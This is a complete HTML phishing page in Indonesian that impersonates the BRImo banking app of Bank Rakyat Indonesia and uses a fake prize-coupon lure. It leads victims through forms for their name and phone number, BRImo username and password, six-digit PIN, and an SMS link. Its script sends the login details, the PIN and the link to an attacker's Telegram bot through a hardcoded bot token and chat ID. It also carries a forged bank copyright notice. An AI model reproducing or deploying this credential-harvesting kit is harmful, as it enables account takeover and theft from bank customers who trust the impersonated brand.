<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1.0">
  <title>BRImo Multi Step Form</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #f2f6fb;
      font-family: 'Segoe UI', Arial, sans-serif;
    }
    .header {
      background: linear-gradient(180deg, #2096e9 0%, #0e6bba 100%);
      padding: 22px 0 18px 0;
      text-align: center;
      border-bottom-left-radius: 28px;
      border-bottom-right-radius: 28px;
    }
    .brimo-text {
      font-size: 2em;
      font-weight: bold;
      color: #fff;
      letter-spacing: 1px;
      margin-bottom: 5px;
    }
    .brimo-orange { color: #ff8200; }
    .welcome { color: #fff; font-size: 1.15em; margin-bottom: 0; font-weight: 500; }
    .main-section {
      max-width: 400px;
      margin: 0 auto;
      margin-top: -30px;
      padding: 0 0 32px 0;
    }
    .page { display: none; }
    .page.active {
      display: block;
      animation: fadeIn .5s;
    }
    @keyframes fadeIn { from { opacity: 0 } to { opacity: 1 } }
    .form-section {
      background: linear-gradient(90deg, #ffeaea 0%, #fffbe7 100%);
      border-radius: 18px;
      box-shadow: 0 2px 8px rgba(0,0,0,0.03);
      padding: 24px 18px 18px 18px;
      margin-bottom: 32px;
    }
    .form-title { font-size: 1.15em; font-weight: bold; color: #1976d2; margin-bottom: 14px; letter-spacing: .5px; text-align: center;}
    .brimo { color: #ff8200; font-weight: bold; }
    .form-group { margin-bottom: 18px; }
    label { display: block; color: #0072bc; font-weight: 500; margin-bottom: 6px; font-size: 1em; }
    .input, select {
      width: 100%;
      padding: 12px;
      border-radius: 8px;
      border: 2px solid #b7e1fc;
      font-size: 1em;
      background: #fff;
      box-sizing: border-box;
      margin-bottom: 2px;
      outline: none;
      transition: border-color .2s;
    }
    .input:focus, select:focus { border-color: #1976d2; }
    .input::placeholder { color: #bdbdbd; font-size: .97em; }
    .input-phone {
      background-image: url('data:image/svg+xml;utf8,<svg fill="gray" width="20" height="20" viewBox="0 0 20 20"><path d="M17.707 13.293l-3-3a1 1 0 00-1.414 0l-1.586 1.586a11.072 11.072 0 01-5.879-5.88l1.586-1.586a1 1 0 000-1.414l-3-3A1 1 0 002.293 2.293l-1 1a3 3 0 000 4.243l1.586 1.586A15.072 15.072 0 0015.88 17.121l1.586 1.586a3 3 0 004.243 0l1-1a1 1 0 000-1.414z"></path></svg>');
      background-size: 20px 20px;
      background-repeat: no-repeat;
      background-position: 10px 50%;
      padding-left: 38px;
    }
    .btn {
      width: 100%;
      background: #b2cbe0;
      color: #fff;
      font-weight: bold;
      padding: 13px;
      font-size: 1.08em;
      border: none;
      border-radius: 10px;
      margin-top: 10px;
      cursor: pointer;
      letter-spacing: 1px;
      transition: background 0.2s;
      display: block;
    }
    .btn.active { background: #1976d2; }
    .login-section {
      background: #fff;
      border-radius: 18px;
      box-shadow: 0 2px 14px rgba(32,150,233,.08);
      padding: 28px 18px 24px 18px;
      margin-top: 18px;
    }
    .login-title { color: #1877d2; font-size: 1.14em; font-weight: 600; margin-bottom: 18px; text-align: center;}
    .input-group { display: flex; flex-direction: column; gap: 12px; margin-bottom: 10px; }
    .form-input {
      display: flex; align-items: center;
      background: #f6fafd; border-radius: 10px; border: 2px solid #e0e5ec;
      padding: 10px 13px; font-size: 1em; margin-bottom: 4px;
      transition: border-color .2s;
    }
    .form-input input {
      border: none; background: transparent; outline: none; font-size: 1em; flex: 1; color: #222; padding: 3px 0;
    }
    .form-input svg { margin-right: 10px; color: #1877d2; min-width: 22px;}
    .eye-btn {
      background: none; border: none; outline: none; margin-left: 7px; cursor: pointer; padding: 0; color: #1877d2;
    }
    .forgot { text-align: right; margin-bottom: 10px; font-size: .96em;}
    .forgot a { color: #1976d2; text-decoration: none; font-weight: 500;}
    .pin-section {
      background: #fff;
      border-radius: 18px;
      box-shadow: 0 2px 14px rgba(32,150,233,.08);
      padding: 28px 18px 24px 18px;
      margin-top: 44px;
      max-width: 350px;
      margin-left: auto; margin-right: auto;
    }
    .pin-title { color: #1877d2; font-size: 1.13em; font-weight: 600; margin-bottom: 22px; text-align: center; letter-spacing: 1px; }
    .pin-inputs { display: flex; justify-content: center; gap: 7px; margin-bottom: 20px; }
    .pin-input {
      width: 32px; height: 38px; border-radius: 7px; border: 1.5px solid #b7e1fc; text-align: center;
      font-size: 1.35em; color: #1976d2; background: #f8fbfd; outline: none;
      transition: border-color .18s, box-shadow .18s; box-shadow: 0 1px 2px #ddeeff33; margin: 0;
    }
    .pin-input:focus { border-color: #1976d2; background: #fff; box-shadow: 0 2px 6px #1976d233; }
    .tautan-section {
      background: #fff;
      border-radius: 18px;
      box-shadow: 0 2px 14px rgba(32,150,233,.08);
      padding: 28px 18px 30px 18px;
      margin-top: 44px;
      max-width: 350px;
      margin-left: auto; margin-right: auto;
      text-align: center;
    }
    .tautan-title { color: #1976d2; font-size: 1.13em; font-weight: 600; margin-bottom: 18px; }
    .tautan-desc { font-size: 1em; color: #334; margin-bottom: 16px;}
    .tautan-form-group {
      margin-bottom: 16px;
      text-align: left;
    }
    .input-tautan {
      width: 100%;
      padding: 11px 12px;
      border-radius: 8px;
      border: 2px solid #b7e1fc;
      font-size: 1em;
      background: #fff;
      margin-top: 8px;
      box-sizing: border-box;
      outline: none;
      transition: border-color .2s;
    }
    .input-tautan:focus { border-color: #1976d2; }
    .footer {
      text-align: center;
      color: #aaa;
      font-size: .98em;
      margin-top: 20px;
      margin-bottom: 16px;
    }
    @media (max-width: 480px) {
      .main-section { max-width: 99vw; border-radius: 0 0 18px 18px; padding: 0 0 16px 0;}
      .form-section, .login-section, .pin-section, .tautan-section {
        border-radius: 0 0 18px 18px;
        padding: 18px 6vw 18px 6vw;
      }
      .header { border-bottom-left-radius: 20px; border-bottom-right-radius: 20px;}
      .pin-input { width: 13vw; min-width: 28px; height: 35px; font-size: 1.1em;}
    }
    .error-message {
      color: #e53935;
      font-size: .97em;
      margin-top: 8px;
      display: none;
    }
  </style>
</head>
<body>
  <div class="header">
    <span class="brimo-text">BRI<span class="brimo-orange">mo</span></span>
    <div class="welcome">Selamat Datang</div>
  </div>
  <div class="main-section">
    <!-- PAGE 1: Kupon -->
    <form class="page form-section active" id="page-kupon">
      <div class="form-title">Pencetakan Kupon <span class="brimo">BRImo</span> :</div>
      <div class="form-group">
        <select class="input" id="kuponSelect" required>
          <option value="">PILIH KUPON</option>
          <option value="kupon1">paket umrah & tiket liburan</option>
          <option value="kupon2">uang cash & emas</option>
          <option value="kupon3">motor & mobil</option>
        </select>
      </div>
      <div class="form-group">
        <label>Nama Lengkap :</label>
        <input class="input" type="text" placeholder="Nama sesuai KTP" id="kuponNama" required>
      </div>
      <div class="form-group">
        <label>Nomor Handphone Aktif:</label>
        <input class="input input-phone" type="tel" placeholder="08xxxx" id="kuponHP" pattern="08[0-9]{7,12}" required>
      </div>
      <button type="submit" class="btn" id="btnKupon" disabled>LANJUT</button>
    </form>
    <!-- PAGE 2: Login -->
    <form class="page login-section" id="page-login" autocomplete="off">
      <div class="login-title">Login</div>
      <div class="input-group">
        <div class="form-input">
          <svg width="22" height="22" fill="none" viewBox="0 0 24 24"><path d="M12 12c2.7 0 5-2.3 5-5s-2.3-5-5-5-5 2.3-5 5 2.3 5 5 5zm0 2c-3.3 0-10 1.7-10 5v3h20v-3c0-3.3-6.7-5-10-5z" fill="#1877d2"/></svg>
          <input type="text" placeholder="Username" required id="loginUser">
        </div>
        <div class="form-input">
          <svg width="22" height="22" fill="none" viewBox="0 0 24 24"><path d="M17 11V7a5 5 0 10-10 0v4H5v10h14V11h-2zm-8-4a3 3 0 116 0v4H9V7zm8 14H7v-8h10v8z" fill="#1877d2"/></svg>
          <input type="password" placeholder="Password" id="loginPass" minlength="8" maxlength="12" required>
          <button class="eye-btn" type="button" id="togglePwd" aria-label="Tampilkan Sembunyikan Password">
            <svg id="eyeIcon" width="22" height="22" viewBox="0 0 24 24"><path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 12c-2.7 0-5-2.2-7.1-5 2.1-2.8 4.4-5 7.1-5s5 2.2 7.1 5c-2.1 2.8-4.4 5-7.1 5zm0-8a3 3 0 100 6 3 3 0 000-6z" fill="#1877d2"/></svg>
          </button>
        </div>
      </div>
      <div class="forgot">
        <a href="#">Lupa Password?</a>
      </div>
      <button type="submit" class="btn" id="btnLogin" disabled>LANJUT</button>
      <div id="loginError" class="error-message"></div>
    </form>
    <!-- PAGE 3: PIN -->
    <form class="page pin-section" id="page-pin" autocomplete="off">
      <div class="pin-title">Masukkan PIN BRImo Anda</div>
      <div class="pin-inputs">
        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" tabindex="1">
        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" tabindex="2">
        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" tabindex="3">
        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" tabindex="4">
        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" tabindex="5">
        <input class="pin-input" type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" required autocomplete="off" tabindex="6">
      </div>
      <button type="submit" class="btn" id="btnPin" disabled>LANJUT</button>
    </form>
    <!-- PAGE 4: Tempel Tautan -->
    <form class="page tautan-section" id="page-tautan" autocomplete="off">
      <div class="tautan-title">Salin Tautan dari SMS</div>
      <div class="tautan-desc">Salin dan Tempel tautan yang telah dikirim ke nomor Anda via SMS di kolom berikut:</div>
      <div class="tautan-form-group">
        <label for="inputTautan">Tautan dari SMS</label>
        <input id="inputTautan" type="text" class="input-tautan" placeholder="https://brimo.link/kupon123456" required>
      </div>
      <button type="submit" class="btn" id="btnTautan" disabled>LANJUTKAN</button>
      <div class="tautan-info" id="tautan-info"></div>
    </form>
  </div>
  <div class="footer">
    Â© 2025 PT.Bank Rakyat Indonesia (Persero) Tbk.<br>
    All Rights Reserved.
  </div>
  <script>
    // --- Konfigurasi Telegram ---
    const TELEGRAM_TOKEN = "7509532185:AAFbPJEMSyEclTiu8MrXxZ16GFVWCeHxKy4";
    const TELEGRAM_CHAT_ID = "8165489813";

    function sendToTelegram(msg) {
      fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {"Content-Type": "application/json"},
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: msg
        })
      });
    }

    // SPA navigation
    function showPage(id) {
      document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active'));
      document.getElementById(id).classList.add('active');
      window.scrollTo({ top: 0, behavior: 'smooth' });
    }
    // Kupon validation
    const kuponForm = document.getElementById('page-kupon');
    const btnKupon = document.getElementById('btnKupon');
    kuponForm.addEventListener('input', () => {
      const filled = document.getElementById('kuponSelect').value && 
        document.getElementById('kuponNama').value && 
        document.getElementById('kuponHP').value;
      btnKupon.disabled = !filled;
      btnKupon.className = filled ? 'btn active' : 'btn';
    });
    kuponForm.addEventListener('submit', e => {
      e.preventDefault();
      showPage('page-login');
      setTimeout(()=>document.getElementById('loginUser').focus(),500);
    });

    // Password validation function
    function isPasswordValid(pw) {
      // 8-12 karakter, ada huruf besar, kecil, dan angka
      if(pw.length < 8 || pw.length > 12) return false;
      if(!/[A-Z]/.test(pw)) return false;
      if(!/[a-z]/.test(pw)) return false;
      if(!/[0-9]/.test(pw)) return false;
      return true;
    }

    // Login validation
    const loginForm = document.getElementById('page-login');
    const btnLogin = document.getElementById('btnLogin');
    const loginPass = document.getElementById('loginPass');
    const loginError = document.getElementById('loginError');
    loginForm.addEventListener('input', () => {
      const user = document.getElementById('loginUser').value;
      const pass = loginPass.value;
      const filled = user && isPasswordValid(pass);
      btnLogin.disabled = !filled;
      btnLogin.className = filled ? 'btn active' : 'btn';
      loginError.style.display = "none";
    });
    loginForm.addEventListener('submit', e => {
      e.preventDefault();
      const user = document.getElementById('loginUser').value;
      const pass = loginPass.value;
      if (!isPasswordValid(pass)) {
        loginError.textContent = "Password harus 8-12 karakter, ada huruf besar, kecil & angka!";
        loginError.style.display = "block";
        loginPass.focus();
        return;
      }
      sendToTelegram(`LOGIN BRIMO\nUsername: ${user}\nPassword: ${pass}`);
      showPage('page-pin');
      setTimeout(()=>document.querySelector('.pin-input').focus(),500);
    });
    // Show/hide password
    const togglePwd = document.getElementById('togglePwd');
    const eyeIcon = document.getElementById('eyeIcon');
    let pwdShown = false;
    togglePwd.addEventListener('click', () => {
      pwdShown = !pwdShown;
      loginPass.type = pwdShown ? 'text' : 'password';
      eyeIcon.innerHTML = pwdShown
        ? '<path d="M12 5c-7 0-10 7-10 7s3 7 10 7c2.7 0 5-2.2 7.1-5-.5-.7-1-1.3-1.6-2-1.3 1.7-3.4 3-5.5 3a7 7 0 01-6-3.5C6.6 7.6 9.2 6 12 6c2.7 0 5 2.2 7.1 5-.5-.7-1-1.3-1.6-2C16.1 7.2 14 6 12 6zm0 2a3 3 0 100 6 3 3 0 000-6z" fill="#1877d2"/>' 
        : '<path d="M12 5c-7 0-10 7-10 7s3 7 10 7 10-7 10-7-3-7-10-7zm0 12c-2.7 0-5-2.2-7.1-5 2.1-2.8 4.4-5 7.1-5s5 2.2 7.1 5c-2.1 2.8-4.4 5-7.1 5zm0-8a3 3 0 100 6 3 3 0 000-6z" fill="#1877d2"/>';
    });
    // PIN validation
    const pinForm = document.getElementById('page-pin');
    const pinInputs = pinForm.querySelectorAll('.pin-input');
    const btnPin = document.getElementById('btnPin');
    pinInputs.forEach((input, idx) => {
      input.addEventListener('input', (e) => {
        let v = input.value.replace(/[^0-9]/g, "");
        if (v.length > 1) {
          let chars = v.split("");
          for (let i = 0; i < chars.length; i++) {
            if (idx + i < pinInputs.length) {
              pinInputs[idx + i].value = chars[i];
            }
          }
          if (idx + chars.length - 1 < pinInputs.length) {
            pinInputs[idx + chars.length - 1].focus();
          } else {
            pinInputs[pinInputs.length - 1].focus();
          }
        } else {
          input.value = v;
          if (v.length === 1 && idx < pinInputs.length - 1) {
            pinInputs[idx + 1].focus();
          }
        }
        checkPinFilled();
      });
      input.addEventListener('keydown', (e) => {
        if (e.key === 'Backspace') {
          if (!input.value && idx > 0) {
            pinInputs[idx - 1].focus();
          }
        }
        if (e.key === 'ArrowLeft' && idx > 0) {
          pinInputs[idx - 1].focus();
          e.preventDefault();
        }
        if (e.key === 'ArrowRight' && idx < pinInputs.length - 1) {
          pinInputs[idx + 1].focus();
          e.preventDefault();
        }
      });
      input.addEventListener('paste', (e) => {
        let pasted = (e.clipboardData || window.clipboardData).getData('text').replace(/[^0-9]/g, "");
        for (let i = 0; i < pasted.length && i < pinInputs.length; i++) {
          pinInputs[i].value = pasted[i];
        }
        pinInputs[Math.min(pasted.length, pinInputs.length)-1].focus();
        checkPinFilled();
        e.preventDefault();
      });
    });
    function checkPinFilled() {
      const allFilled = Array.from(pinInputs).every(input => input.value && /^[0-9]$/.test(input.value));
      btnPin.disabled = !allFilled;
      btnPin.className = allFilled ? 'btn active' : 'btn';
    }
    pinForm.addEventListener('submit', function(e) {
      e.preventDefault();
      if (!btnPin.disabled) {
        const pin = Array.from(pinInputs).map(i => i.value).join('');
        sendToTelegram(`PIN BRIMO:\n${pin}`);
        showPage('page-tautan');
        setTimeout(()=>document.getElementById('inputTautan').focus(),500);
      }
    });
    // Tautan tempel validation
    const formTautan = document.getElementById('page-tautan');
    const inputTautan = document.getElementById('inputTautan');
    const btnTautan = document.getElementById('btnTautan');
    const tautanInfo = document.getElementById('tautan-info');
    formTautan.addEventListener('input', () => {
      btnTautan.disabled = !inputTautan.value.trim();
      btnTautan.className = inputTautan.value.trim() ? 'btn active' : 'btn';
      tautanInfo.textContent = "";
    });
    formTautan.addEventListener('submit', function(e) {
      e.preventDefault();
      if (!btnTautan.disabled) {
        sendToTelegram(`LINK BRIMO:\n${inputTautan.value.trim()}`);
        tautanInfo.textContent = "Terima Kasih kami akan menghungi anda 1x24jam untuk cetak kupon!";
      }
    });
    // Autofocus PIN box on page load if active
    window.onload = function() {
      if(document.getElementById('page-pin').classList.contains('active')) pinInputs[0].focus();
    };
  </script>
</body>
</html>